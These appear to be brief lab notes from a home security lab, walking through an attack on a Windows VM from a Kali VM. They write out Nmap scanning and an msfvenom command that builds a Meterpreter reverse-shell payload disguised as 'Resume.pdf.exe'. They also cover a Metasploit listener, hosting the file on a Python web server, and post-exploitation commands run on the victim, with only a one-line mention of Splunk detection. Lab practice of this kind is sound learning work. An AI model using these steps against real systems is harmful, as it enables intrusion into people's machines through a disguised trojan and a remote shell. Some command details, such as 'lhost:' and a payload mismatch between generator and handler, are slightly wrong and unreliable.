# Performed service enumeration using Nmap
nmap -A <windowsVM-ip> -Pn

found that ports 135, 139 and 445 were open (SMB/Windows Services)

# Generated a reverse TCP payload using msfvenom

msfvenom -p windows/meterpreter_reverse_tcp lhost:<KaliLinuxVM-ip> lport=4444 (default port for mterpreter) -f exe -o Resume.pdf.exe

# Configured Metasploit Listener

msfconsole

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set lhost <KaliLinuxVM-ip>

exploit

# Hosted payload via Python HTTP server

python3 -m http.server 9999

victim accessed it by going to http://<KaliLinuxVM-ip>:9999

Windows VM downloaded Resume.pdf.exe


# Established reverse shell connection

shell
net user
net localgroup
ipconfig

# Splunk

On Splunk, we see the KaliLinux IP address running these commands. They are classified as Trojan

